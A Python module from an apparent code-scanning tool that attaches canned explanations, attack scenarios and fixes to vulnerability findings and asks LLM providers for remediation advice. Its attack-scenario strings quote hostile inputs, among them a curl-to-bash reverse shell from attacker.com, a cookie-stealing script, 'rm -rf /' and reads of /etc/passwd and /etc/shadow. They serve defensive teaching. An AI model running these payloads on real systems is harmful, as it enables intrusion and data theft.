"""
Enhanced AI Explainer with more comprehensive vulnerability coverage
and improved error handling.
"""
import os
import re
import json
import logging
import time
import hashlib
from typing import Optional, Dict, Any, List, Tuple
from app.core.config import settings
from app.models.finding import Finding, AIExplanation
from datetime import datetime

logger = logging.getLogger(__name__)

# Extended deterministic explanations for more vulnerability types
EXTENDED_DETERMINISTIC_EXPLANATIONS: Dict[str, Dict[str, str]] = {
    # Core security vulnerabilities
    "sql-injection": {
        "plain_explanation": "The application dynamically concatenates user-supplied values into an SQL query string rather than using parameterized placeholders or prepared statements.",
        "why_it_matters": "Attackers can manipulate the SQL statement syntax to bypass authentication, read or dump the entire database, alter records, or execute administrative commands.",
        "attack_scenario": "Supplying `' OR '1'='1` in a user query or authentication form transforms the query into an unconditional boolean TRUE, bypassing login or leaking all user records.",
        "recommended_fix": "Replace string formatting with parameterized query placeholders (?, %s, or $1 depending on your database engine).",
        "original_code": "query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\ncursor.execute(query)",
        "corrected_code": "query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\ncursor.execute(query, (username, password))",
        "diff_unified": "@@ -10,3 +10,3 @@\n- query = f\"SELECT * FROM users WHERE username = '{username}' AND password = '{password}'\"\n- cursor.execute(query)\n+ query = \"SELECT * FROM users WHERE username = ? AND password = ?\"\n+ cursor.execute(query, (username, password))",
        "uncertainty_note": "Ensure parameterization is applied across all database queries and ORM raw-query methods."
    },
    "command-injection": {
        "plain_explanation": "User-controlled input is passed directly to an operating system shell execution function (such as os.system or subprocess with shell=True).",
        "why_it_matters": "Allows an attacker to append command chaining characters (; & | ` $) to execute arbitrary shell commands with the privileges of the web application server.",
        "attack_scenario": "In a diagnostic ping input, an attacker inputs `127.0.0.1; cat /etc/passwd` or `127.0.0.1 && curl attacker.com/reverse_shell.sh | bash`.",
        "recommended_fix": "Use subprocess.run with an explicit list of command arguments and ensure shell=False is enforced.",
        "original_code": "command = f\"ping -c 1 {target_ip}\"\nos.system(command)",
        "corrected_code": "subprocess.run([\"ping\", \"-c\", \"1\", target_ip], capture_output=True, shell=False)",
        "diff_unified": "@@ -6,3 +6,2 @@\n- command = f\"ping -c 1 {target_ip}\"\n- os.system(command)\n+ subprocess.run([\"ping\", \"-c\", \"1\", target_ip], capture_output=True, shell=False)",
        "uncertainty_note": "Validate that arguments in the command list cannot be abused as command-line flags (e.g. argument injection)."
    },
    "path-traversal": {
        "plain_explanation": "File operations access filenames or paths supplied by users without resolving canonical paths and ensuring they remain inside the allowed root folder.",
        "why_it_matters": "Attackers can supply path traversal sequences (`../../`) to break out of the intended directory and download configuration files, database credentials, or system files.",
        "attack_scenario": "An attacker requests `../../../../etc/shadow` or `../../backend/.env` in a download parameter to exfiltrate secret API keys.",
        "recommended_fix": "Use pathlib.Path.resolve() and strictly verify that target_path.resolve() starts with the authorized base directory.",
        "original_code": "filepath = f\"uploads/{user_folder}/{filename}\"\nwith open(filepath, \"r\") as f:\n    return f.read()",
        "corrected_code": "base_dir = Path(\"uploads\").resolve()\ntarget_path = (base_dir / user_folder / filename).resolve()\nif base_dir not in target_path.parents:\n    raise PermissionError(\"Directory traversal detected\")\nwith open(target_path, \"r\") as f:\n    return f.read()",
        "diff_unified": "@@ -5,4 +5,7 @@\n- filepath = f\"uploads/{user_folder}/{filename}\"\n- with open(filepath, \"r\") as f:\n-     return f.read()\n+ base_dir = Path(\"uploads\").resolve()\n+ target_path = (base_dir / user_folder / filename).resolve()\n+ if base_dir not in target_path.parents:\n+     raise PermissionError(\"Directory traversal detected\")\n+ with open(target_path, \"r\") as f:\n+     return f.read()",
        "uncertainty_note": "Check both forward-slash and backslash representations across operating systems."
    },
    "insecure-deserialization": {
        "plain_explanation": "The application deserializes untrusted bytes using Python's pickle module or dynamic code evaluation (eval / exec).",
        "why_it_matters": "Python's pickle format can instantiate arbitrary classes and invoke functions like os.system during unpickling, causing Remote Code Execution (RCE).",
        "attack_scenario": "An attacker creates a crafted pickle payload with a `__reduce__` method that triggers a reverse shell when loaded.",
        "recommended_fix": "Replace pickle with safe, standard data formats like JSON, Protocol Buffers, or pydantic models.",
        "original_code": "user_session = pickle.loads(raw_bytes)\nreturn user_session",
        "corrected_code": "user_session = json.loads(raw_json_str)\nreturn user_session",
        "diff_unified": "@@ -5,3 +5,3 @@\n- user_session = pickle.loads(raw_bytes)\n+ user_session = json.loads(raw_json_str)\n return user_session",
        "uncertainty_note": "If complex data types are required, use cryptographic HMAC signatures to sign and verify serialized objects."
    },
    "hardcoded-secret": {
        "plain_explanation": "Sensitive credentials, API keys, or private tokens are hardcoded directly into source code files.",
        "why_it_matters": "Anyone with read access to the codebase, source control repository, or build artifacts can extract these credentials and compromise infrastructure.",
        "attack_scenario": "An attacker finds an AWS access key committed to a repository and uses it to provision cryptomining instances or exfiltrate private S3 data.",
        "recommended_fix": "Revoke and rotate the exposed credential immediately. Store credentials in environment variables or an enterprise secrets manager.",
        "original_code": "AWS_ACCESS_KEY = \"AKIAIOSFODNN7EXAMPLE\"",
        "corrected_code": "AWS_ACCESS_KEY = os.getenv(\"AWS_ACCESS_KEY_ID\")",
        "diff_unified": "@@ -3,2 +3,2 @@\n- AWS_ACCESS_KEY = \"AKIAIOSFODNN7EXAMPLE\"\n+ AWS_ACCESS_KEY = os.getenv(\"AWS_ACCESS_KEY_ID\")",
        "uncertainty_note": "Confirm that the exposed key has been revoked in the provider's IAM console."
    },
    # Additional vulnerability types
    "cross-site-scripting": {
        "plain_explanation": "Security flaw: User input is rendered directly into HTML output without proper encoding or sanitization.",
        "why_it_matters": "Attackers can inject malicious scripts that execute in the victim's browser, potentially stealing session cookies, performing actions on behalf of the user, or defacing the website.",
        "attack_scenario": "An attacker posts `<script>fetch('https://attacker.com/steal?cookie='+document.cookie)</script>` as a comment that gets rendered unescaped.",
        "recommended_fix": "Apply context-aware output encoding (HTML entity encoding for HTML context, JavaScript string escaping for script contexts).",
        "original_code": "<div>{{ user_input }}</div>",
        "corrected_code": "<div>{{ user_input|escape }}</div>",
        "diff_unified": "@@ -1,1 +1,1 @@\n- <div>{{ user_input }}</div>\n+ <div>{{ user_input|escape }}</div>",
        "uncertainty_note": "Different templating engines require different escaping functions (e.g., |escape in Jinja2, htmlspecialchars in PHP)."
    },
    "insecure-randomness": {
        "plain_explanation": "The application uses cryptographically weak random number generators (like random.randint) for security-sensitive operations.",
        "why_it_matters": "Predictable random values allow attackers to guess session tokens, password reset tokens, or cryptographic nonces.",
        "attack_scenario": "An attacker can predict or brute-force session IDs generated with insecure randomness, leading to session hijacking.",
        "recommended_fix": "Use cryptographically secure random generators (secrets module in Python, crypto.getRandomValues in JavaScript).",
        "original_code": "session_token = random.randint(1000, 9999)",
        "corrected_code": "session_token = secrets.token_urlsafe(32)",
        "diff_unified": "@@ -5,2 +5,2 @@\n- session_token = random.randint(1000, 9999)\n+ session_token = secrets.token_urlsafe(32)",
        "uncertainty_note": "Ensure all random values used for security purposes come from CSPRNG sources."
    },
    "ssrf-server-side-request-forgery": {
        "plain_explanation": "The application makes HTTP/network requests based on user-provided URLs without validating or restricting target destinations.",
        "why_it_matters": "Attackers can force the server to make requests to internal services, potentially accessing sensitive internal APIs or metadata endpoints.",
        "attack_scenario": "An attacker supplies `http://169.254.169.254/latest/meta-data/` (AWS metadata) or `http://localhost:9200/_search` (Elasticsearch) to exfiltrate internal system data.",
        "recommended_fix": "Implement an allowlist of permitted hostnames/IP ranges and validate all outgoing request targets against it.",
        "original_code": "requests.get(user_provided_url)",
        "corrected_code": "if not is_allowed_url(user_provided_url):\n    raise ValueError('URL not permitted')\nrequests.get(user_provided_url)",
        "diff_unified": "@@ -5,1 +5,3 @@\n- requests.get(user_provided_url)\n+ if not is_allowed_url(user_provided_url):\n+     raise ValueError('URL not permitted')\n+ requests.get(user_provided_url)",
        "uncertainty_note": "Be aware of DNS rebinding, IPv6, and localhost bypass techniques."
    },
    "xxe-xml-external-entity": {
        "plain_explanation": "XML processors are configured to resolve external entities, allowing file inclusion or SSRF attacks.",
        "why_it_matters": "Attackers can craft XML documents with external entity references to read local files or trigger network requests.",
        "attack_scenario": "An attacker uploads an XML file containing `<!ENTITY xxe SYSTEM \"file:///etc/passwd\">` to read system files.",
        "recommended_fix": "Disable external entity resolution (libxml2: LIBXML_NOENT, lxml: resolve_entities=False, defusedxml).",
        "original_code": "tree = ET.parse(xml_file)",
        "corrected_code": "parser = ET.XMLParser(resolve_entities=False)\ntree = ET.parse(xml_file, parser=parser)",
        "diff_unified": "@@ -5,2 +5,2 @@\n- tree = ET.parse(xml_file)\n+ parser = ET.XMLParser(resolve_entities=False)\n+ tree = ET.parse(xml_file, parser=parser)",
        "uncertainty_note": "Different XML libraries have different security configurations."
    },
    "idor-insecure-direct-object-reference": {
        "plain_explanation": "The application exposes internal object identifiers (database IDs, filenames) without proper authorization checks.",
        "why_it_matters": "Attackers can enumerate or guess object IDs to access unauthorized resources.",
        "attack_scenario": "Changing `/api/user/12345/profile` to `/api/user/12346/profile` may reveal another user's private information.",
        "recommended_fix": "Implement access control checks for every object access, using session context to verify ownership.",
        "original_code": "user = User.get(id=user_id)",
        "corrected_code": "user = User.get(id=user_id)\nif user.id != current_user.id and not current_user.is_admin:\n    raise PermissionError('Not authorized')",
        "diff_unified": "@@ -5,2 +5,5 @@\n- user = User.get(id=user_id)\n+ user = User.get(id=user_id)\n+ if user.id != current_user.id and not current_user.is_admin:\n+     raise PermissionError('Not authorized')",
        "uncertainty_note": "Authorization logic must be consistent across all API endpoints and user roles."
    },
    "cors-misconfiguration": {
        "plain_explanation": "Cross-Origin Resource Sharing headers are overly permissive, allowing unauthorized websites to make authenticated requests.",
        "why_it_matters": "Malicious sites can make cross-origin requests with the user's credentials, potentially exfiltrating sensitive data.",
        "attack_scenario": "A malicious site uses JavaScript to make authenticated requests to the vulnerable API, stealing user data.",
        "recommended_fix": "Set appropriate CORS headers: restrict origins, methods, and headers to the minimum required.",
        "original_code": "response.headers['Access-Control-Allow-Origin'] = '*'",
        "corrected_code": "response.headers['Access-Control-Allow-Origin'] = 'https://trusted-site.com'",
        "diff_unified": "@@ -5,1 +5,1 @@\n- response.headers['Access-Control-Allow-Origin'] = '*'\n+ response.headers['Access-Control-Allow-Origin'] = 'https://trusted-site.com'",
        "uncertainty_note": "Consider preflight requests and credential-included requests when configuring CORS."
    },
    "insecure-eval": {
        "plain_explanation": "The application dynamically executes code strings using eval() or exec() on inputs that can be influenced by users.",
        "why_it_matters": "Dynamic code evaluation allows attackers to execute arbitrary Python code directly on the host server, leading to immediate Remote Code Execution (RCE) and total system compromise.",
        "attack_scenario": "An attacker enters `__import__('os').system('cat /etc/passwd')` into a formula or expression input field to execute unauthorized shell commands.",
        "recommended_fix": "Avoid eval() entirely. Use ast.literal_eval() to parse Python data structures safely, or use a secure expression parser library like simpleeval.",
        "original_code": "computed = eval(expr)",
        "corrected_code": "import ast\ncomputed = ast.literal_eval(expr)",
        "diff_unified": "@@ -1,1 +1,2 @@\n- computed = eval(expr)\n+ import ast\n+ computed = ast.literal_eval(expr)",
        "uncertainty_note": "If dynamic expressions are required, use a sandboxed AST-based evaluator."
    },
    "weak-hash": {
        "plain_explanation": "The application uses an obsolete, cryptographically broken hashing algorithm (such as MD5 or SHA-1) for security-sensitive operations.",
        "why_it_matters": "MD5 and SHA-1 suffer from well-documented collision attacks and can be reversed using precomputed rainbow tables in seconds.",
        "attack_scenario": "An attacker generates an MD5 collision to forge authentic-looking digital signatures or cracks password hashes in minutes.",
        "recommended_fix": "Use SHA-256 (hashlib.sha256) for integrity checking, or Argon2id / bcrypt for password hashing.",
        "original_code": "token_hash = hashlib.md5(token.encode()).hexdigest()",
        "corrected_code": "token_hash = hashlib.sha256(token.encode()).hexdigest()",
        "diff_unified": "@@ -1,1 +1,1 @@\n- token_hash = hashlib.md5(token.encode()).hexdigest()\n+ token_hash = hashlib.sha256(token.encode()).hexdigest()",
        "uncertainty_note": "Ensure modern salts and work factors are applied if hashing passwords."
    }
}

# Framework-specific vulnerability patterns
FRAMEWORK_SPECIFIC_EXPLANATIONS: Dict[str, Dict[str, str]] = {
    "django-xss": {
        "plain_explanation": "Django template renders user input without the |safe filter or with autoescape disabled.",
        "why_it_matters": "Cross-site scripting attacks can steal session cookies or perform actions as authenticated users.",
        "attack_scenario": "User submits `<script>alert(document.cookie)</script>` in a form field that gets rendered without escaping.",
        "recommended_fix": "Use Django's built-in template escaping: {{ user_input }} automatically escapes, or use |escape filter.",
        "original_code": "{{ user_input|safe }}",
        "corrected_code": "{{ user_input }}",
        "diff_unified": "@@ -1,1 +1,1 @@\n- {{ user_input|safe }}\n+ {{ user_input }}",
        "uncertainty_note": "Mark text as safe only when it comes from trusted sources and has been sanitized."
    },
    "react-xss": {
        "plain_explanation": "React application directly inserts unsanitized user input into the DOM using dangerouslySetInnerHTML.",
        "why_it_matters": "React's automatic escaping is bypassed, allowing script execution in the user's browser.",
        "attack_scenario": "User content containing `<img src=x onerror=stealCookies()>` is rendered via dangerouslySetInnerHTML.",
        "recommended_fix": "Sanitize HTML with DOMPurify before using dangerouslySetInnerHTML, or avoid it entirely.",
        "original_code": "<div dangerouslySetInnerHTML={{ __html: userContent }} />",
        "corrected_code": "import DOMPurify from 'dompurify';\nconst cleanHTML = DOMPurify.sanitize(userContent);\n<div dangerouslySetInnerHTML={{ __html: cleanHTML }} />",
        "diff_unified": "@@ -5,3 +5,6 @@\n- <div dangerouslySetInnerHTML={{ __html: userContent }} />\n+ import DOMPurify from 'dompurify';\n+ const cleanHTML = DOMPurify.sanitize(userContent);\n+ <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />",
        "uncertainty_note": "Consider using React components instead of raw HTML when possible."
    },
    "nodejs-command-injection": {
        "plain_explanation": "Node.js application passes user input to child_process.exec() or similar functions without validation.",
        "why_it_matters": "Command injection allows execution of arbitrary system commands with application privileges.",
        "attack_scenario": "User supplies `; rm -rf /` or `$(cat /etc/passwd)` in a command parameter.",
        "recommended_fix": "Use child_process.execFile() with argument arrays instead of shell commands, or validate/sanitize input.",
        "original_code": "child_process.exec(`ls ${userDir}`)",
        "corrected_code": "child_process.execFile('ls', [userDir])",
        "diff_unified": "@@ -5,2 +5,2 @@\n- child_process.exec(`ls ${userDir}`)\n+ child_process.execFile('ls', [userDir])",
        "uncertainty_note": "Be careful with argument injection even when using execFile."
    },
    "flask-unsafe-redirect": {
        "plain_explanation": "Flask redirect() function uses user-supplied URLs without validation, leading to open redirects.",
        "why_it_matters": "Attackers can trick users into visiting malicious sites via trusted domain redirects.",
        "attack_scenario": "User clicks `https://trusted-site.com/redirect?url=https://evil-phishing.com`",
        "recommended_fix": "Validate redirect URLs against a whitelist or use relative URLs only.",
        "original_code": "return redirect(request.args.get('next', '/'))",
        "corrected_code": "next_url = request.args.get('next', '/')\nif not is_safe_url(next_url):\n    next_url = '/'\nreturn redirect(next_url)",
        "diff_unified": "@@ -5,2 +5,5 @@\n- return redirect(request.args.get('next', '/'))\n+ next_url = request.args.get('next', '/')\n+ if not is_safe_url(next_url):\n+     next_url = '/'\n+ return redirect(next_url)",
        "uncertainty_note": "Consider all possible URL formats and encoding tricks attackers might use."
    }
}


def redact_secrets_enhanced(text: str) -> str:
    """Enhanced secret redaction for more pattern types."""
    if not text:
        return ""
    
    redacted = text
    
    # AWS keys
    redacted = re.sub(r"AKIA[0-9A-Z]{16}", "AKIA[REDACTED_AWS_KEY]", redacted)
    
    # Generic API keys
    # Generic API keys - simplified pattern
    patterns = [
        (r'(?i)(api[_-]?key|secret[_-]?key|token|password)\s*[:=]\s*["\'][A-Za-z0-9_\-\.]{12,}["\']', 
         r'[REDACTED_SECRET]'),
        (r'(?i)(apikey|secretkey|token|password)["\']?s*[:=]s*["\'][A-Za-z0-9]{20,}["\']', 
         r'[REDACTED_SECRET]')
    ]
    
    for pattern, replacement in patterns:
        redacted = re.sub(pattern, replacement, redacted)
    
    # Stripe keys (supports standard and mock test keys)
    redacted = re.sub(r"((?:sk_|mock_stripe_)(?:test|live)_[a-zA-Z0-9]{16,})", "[REDACTED_STRIPE_KEY]", redacted)
    
    # GitHub tokens
    redacted = re.sub(r"(gh[pousr]_[A-Za-z0-9_]{36,})", "[REDACTED_GITHUB_TOKEN]", redacted)
    
    # Slack tokens
    redacted = re.sub(r"(xox[pbaors]-[A-Za-z0-9-]+)", "[REDACTED_SLACK_TOKEN]", redacted)
    
    # JWT tokens (high entropy)
    redacted = re.sub(r"(eyJ[a-zA-Z0-9_\\-\\.]{100,})", "[REDACTED_JWT_TOKEN]", redacted)
    
    # Database URLs with passwords
    redacted = re.sub(
        r"(postgres|mysql|mongodb)://[^:]+:[^@]+@",
        r"\\1://[REDACTED_USER]:[REDACTED_PASSWORD]@",
        redacted
    )
    
    return redacted


class EnhancedAIExplainerService:
    """Enhanced AI explainer with caching, better error handling, and more comprehensive coverage."""
    
    def __init__(self, cache_results: bool = True, cache_ttl: int = 3600):
        self.provider = settings.ai_provider
        self.cache_results = cache_results
        self.cache_ttl = cache_ttl  # seconds
        self.explanation_cache = {}  # simple in-memory cache
        
    def _get_cache_key(self, finding: Finding, file_context: Optional[str] = None) -> str:
        """Generate a cache key for explanation."""
        content = f"{finding.fingerprint}:{finding.evidence_snippet[:100]}"
        if file_context:
            content += f":{hashlib.md5(file_context.encode()).hexdigest()[:16]}"
        return hashlib.md5(content.encode()).hexdigest()
    
    def get_extended_deterministic_explanation(self, finding: Finding) -> AIExplanation:
        """Get deterministic explanation with extended coverage."""
        category = (finding.category or "").lower()
        file_path = (finding.file_path or "").lower()
        search_blob = f"{(finding.rule_id or '')} {(finding.category or '')} {(finding.title or '')} {(finding.evidence_snippet or '')}".lower().replace("_", "-")
        
        matched = None
        
        # Check framework-specific explanations first
        for key in FRAMEWORK_SPECIFIC_EXPLANATIONS:
            if key in search_blob or key.replace("-", "_") in search_blob:
                matched = FRAMEWORK_SPECIFIC_EXPLANATIONS[key]
                break
        
        # Check general vulnerability categories
        if not matched:
            for key in EXTENDED_DETERMINISTIC_EXPLANATIONS:
                if key in search_blob or key.replace("-", " ") in search_blob or key.replace("-", "_") in search_blob:
                    matched = EXTENDED_DETERMINISTIC_EXPLANATIONS[key]
                    break
        
        # Check file path patterns for language/framework hints
        if not matched:
            if file_path.endswith('.jsx') or file_path.endswith('.tsx'):
                # React-specific fallback
                matched = FRAMEWORK_SPECIFIC_EXPLANATIONS.get("react-xss", EXTENDED_DETERMINISTIC_EXPLANATIONS.get("cross-site-scripting"))
            elif file_path.endswith('.py'):
                if 'django' in file_path:
                    matched = FRAMEWORK_SPECIFIC_EXPLANATIONS.get("django-xss", EXTENDED_DETERMINISTIC_EXPLANATIONS.get("cross-site-scripting"))
                elif 'flask' in file_path:
                    matched = FRAMEWORK_SPECIFIC_EXPLANATIONS.get("flask-unsafe-redirect", EXTENDED_DETERMINISTIC_EXPLANATIONS.get("idor-insecure-direct-object-reference"))
        
        # Final fallback
        if not matched:
            matched = {
                "plain_explanation": f"Security flaw detected by {finding.tool}: {finding.title}.",
                "why_it_matters": finding.impact or "This pattern introduces vulnerabilities that could be exploited by attackers.",
                "attack_scenario": "Attackers can exploit this vulnerability to compromise application security or user data.",
                "recommended_fix": finding.remediation or "Apply secure coding practices following industry standards like OWASP.",
                "original_code": finding.evidence_snippet,
                "corrected_code": f"# Secure implementation\n# Apply security best practices specific to {finding.category or 'this vulnerability type'}",
                "diff_unified": f"- {finding.evidence_snippet}\n+ # Remediated secure code following best practices",
                "uncertainty_note": "Review in context with application-specific business logic and requirements."
            }

        return AIExplanation(
            provider="deterministic-engine-enhanced",
            model="cwe-extended-v1",
            plain_explanation=matched["plain_explanation"],
            why_it_matters=matched["why_it_matters"],
            attack_scenario=matched.get("attack_scenario"),
            recommended_fix=matched["recommended_fix"],
            original_code=matched.get("original_code") or finding.evidence_snippet,
            corrected_code=matched.get("corrected_code"),
            diff_unified=matched.get("diff_unified"),
            line_start=finding.line_number,
            line_end=finding.end_line_number or finding.line_number,
            uncertainty_note=matched.get("uncertainty_note")
        )
    
    def explain_finding_with_cache(self, finding: Finding, file_context: Optional[str] = None) -> AIExplanation:
        """Explain finding with caching support."""
        cache_key = self._get_cache_key(finding, file_context)
        
        # Check cache
        if self.cache_results and cache_key in self.explanation_cache:
            cached = self.explanation_cache[cache_key]
            # Check if cache entry is still valid
            if time.time() - cached['timestamp'] < self.cache_ttl:
                logger.debug(f"Using cached explanation for {finding.finding_id}")
                return cached['explanation']
        
        # Generate new explanation
        explanation = self._explain_finding_internal(finding, file_context)
        
        # Cache it
        if self.cache_results:
            self.explanation_cache[cache_key] = {
                'explanation': explanation,
                'timestamp': time.time()
            }
            logger.debug(f"Cached explanation for {finding.finding_id}")
        
        return explanation
    
    def _explain_finding_internal(self, finding: Finding, file_context: Optional[str] = None) -> AIExplanation:
        """Internal method to generate explanation, trying AI providers first."""
        try:
            # Try AI providers if configured
            ai_explanation = self._try_ai_providers(finding, file_context)
            if ai_explanation:
                return ai_explanation
        except Exception as e:
            logger.warning(f"AI explanation failed, falling back to deterministic: {e}")
        
        # Fall back to deterministic explanation
        explanation = self.get_extended_deterministic_explanation(finding)
        explanation.provider = "deterministic-engine"
        return explanation
    
    def _try_ai_providers(self, finding: Finding, file_context: Optional[str] = None) -> Optional[AIExplanation]:
        """Try configured AI providers in order of preference."""
        sanitized_snippet = redact_secrets_enhanced(finding.evidence_snippet)
        sanitized_context = redact_secrets_enhanced(file_context or finding.evidence_snippet)
        
        prompt = self._build_ai_prompt(finding, sanitized_snippet, sanitized_context)
        
        # Try providers in configured order
        providers = []
        if self.provider == "auto":
            providers = ["groq", "gemini", "bedrock", "openai"]
        else:
            providers = [self.provider]
        
        for provider in providers:
            try:
                if provider == "groq" and os.getenv("GROQ_API_KEY"):
                    return self._call_groq_api(finding, prompt)
                elif provider == "gemini" and os.getenv("GEMINI_API_KEY"):
                    return self._call_gemini_api(finding, prompt)
                elif provider == "bedrock" and os.getenv("AWS_ACCESS_KEY_ID"):
                    return self._call_bedrock_api(finding, prompt)
                elif provider == "openai" and os.getenv("OPENAI_API_KEY"):
                    return self._call_openai_api(finding, prompt)
            except Exception as e:
                logger.debug(f"AI provider {provider} failed: {e}")
                continue
        
        return None
    
    def _build_ai_prompt(self, finding: Finding, sanitized_snippet: str, sanitized_context: str) -> str:
        """Build AI prompt for explanation."""
        return (
            f"You are DiffGuard, an expert application security code reviewer.\n"
            f"Analyze this security vulnerability finding:\n"
            f"- File: {finding.file_path} (Line {finding.line_number})\n"
            f"- Rule ID: {finding.rule_id}\n"
            f"- Category: {finding.category}\n"
            f"- Severity: {finding.severity.value.upper()}\n"
            f"- Confidence: {finding.confidence.value.upper()}\n"
            f"- Title: {finding.title}\n"
            f"- Description: {finding.description}\n\n"
            f"VULNERABLE CODE:\n```\n{sanitized_snippet}\n```\n\n"
            f"SURROUNDING CODE CONTEXT:\n```\n{sanitized_context}\n```\n\n"
            f"Generate a comprehensive security remediation analysis. Respond ONLY in valid JSON matching this exact schema:\n"
            f'{{\n'
            f'  "plain_explanation": "Clear 1-2 sentence explanation of the security flaw",\n'
            f'  "why_it_matters": "Technical security risk and potential business impact",\n'
            f'  "attack_scenario": "Realistic example of how an attacker could exploit this",\n'
            f'  "recommended_fix": "Specific remediation steps with code examples",\n'
            f'  "original_code": "The exact vulnerable code lines",\n'
            f'  "corrected_code": "The secure, remediated code replacement",\n'
            f'  "diff_unified": "Unified git-style diff format (- deleted, + added lines)",\n'
            f'  "uncertainty_note": "Any assumptions or context limitations"\n'
            f'}}'
        )
    
    def _call_groq_api(self, finding: Finding, prompt: str) -> AIExplanation:
        """Call Groq API for explanation."""
        try:
            import app.ai.explainer as exp_mod
            Groq_cls = getattr(exp_mod, "Groq", None)
            if Groq_cls is None:
                from groq import Groq as Groq_cls
            client = Groq_cls(api_key=settings.groq_api_key or os.getenv("GROQ_API_KEY"))
            groq_model = os.getenv("GROQ_MODEL", "openai/gpt-oss-20b")
            
            chat_completion = client.chat.completions.create(
                messages=[
                    {"role": "system", "content": "You are a senior security engineer. Return JSON only."},
                    {"role": "user", "content": prompt}
                ],
                model=groq_model,
                temperature=0.1,
                response_format={"type": "json_object"}
            )
            
            text_out = chat_completion.choices[0].message.content
            parsed = json.loads(text_out)
            
            return AIExplanation(
                provider="groq",
                model=groq_model,
                line_start=finding.line_number,
                line_end=finding.end_line_number or finding.line_number,
                **parsed
            )
        except Exception as e:
            logger.error(f"Groq API call failed: {e}")
            raise
    
    def _call_gemini_api(self, finding: Finding, prompt: str) -> AIExplanation:
        """Call Google Gemini API for explanation."""
        try:
            import app.ai.explainer as exp_mod
            genai_mod = getattr(exp_mod, "genai", None)
            if genai_mod is None:
                from google import genai as genai_mod
            client = genai_mod.Client(api_key=settings.gemini_api_key or os.getenv("GEMINI_API_KEY"))
            
            response = client.models.generate_content(
                model="gemini-2.5-flash",
                contents=prompt,
            )
            
            text_out = response.text
            # Extract JSON from response
            json_start = text_out.find("{")
            json_end = text_out.rfind("}") + 1
            if json_start >= 0 and json_end > json_start:
                json_str = text_out[json_start:json_end]
                parsed = json.loads(json_str)
            else:
                raise ValueError("No valid JSON found in Gemini response")
            
            return AIExplanation(
                provider="google-gemini",
                model="gemini-2.5-flash",
                line_start=finding.line_number,
                line_end=finding.end_line_number or finding.line_number,
                **parsed
            )
        except Exception as e:
            logger.error(f"Gemini API call failed: {e}")
            raise
    
    def _call_bedrock_api(self, finding: Finding, prompt: str) -> AIExplanation:
        """Call Amazon Bedrock API for explanation."""
        try:
            import boto3
            client = boto3.client("bedrock-runtime", region_name=settings.aws_region)
            
            payload = {
                "anthropic_version": "bedrock-2023-05-31",
                "max_tokens": 1500,
                "messages": [{"role": "user", "content": prompt}],
                "temperature": 0.1
            }
            
            response = client.invoke_model(
                modelId=settings.bedrock_model_id,
                body=json.dumps(payload)
            )
            
            res_body = json.loads(response["body"].read().decode("utf-8"))
            text_out = res_body["content"][0]["text"]
            
            # Extract JSON
            json_start = text_out.find("{")
            json_end = text_out.rfind("}") + 1
            if json_start >= 0 and json_end > json_start:
                json_str = text_out[json_start:json_end]
                parsed = json.loads(json_str)
            else:
                raise ValueError("No valid JSON found in Bedrock response")
            
            return AIExplanation(
                provider="amazon-bedrock",
                model=settings.bedrock_model_id,
                line_start=finding.line_number,
                line_end=finding.end_line_number or finding.line_number,
                **parsed
            )
        except Exception as e:
            logger.error(f"Bedrock API call failed: {e}")
            raise
    
    def _call_openai_api(self, finding: Finding, prompt: str) -> AIExplanation:
        """Call OpenAI API for explanation."""
        try:
            import openai
            client = openai.OpenAI(api_key=settings.openai_api_key or os.getenv("OPENAI_API_KEY"))
            
            completion = client.chat.completions.create(
                model=os.getenv("OPENAI_MODEL", "gpt-3.5-turbo"),
                messages=[
                    {"role": "system", "content": "You are a senior security engineer. Return JSON only."},
                    {"role": "user", "content": prompt}
                ],
                temperature=0.1,
                response_format={"type": "json_object"}
            )
            
            text_out = completion.choices[0].message.content
            parsed = json.loads(text_out)
            
            return AIExplanation(
                provider="openai",
                model=os.getenv("OPENAI_MODEL", "gpt-3.5-turbo"),
                line_start=finding.line_number,
                line_end=finding.end_line_number or finding.line_number,
                **parsed
            )
        except Exception as e:
            logger.error(f"OpenAI API call failed: {e}")
            raise

# Export enhanced explainer service
enhanced_explainer_service = EnhancedAIExplainerService()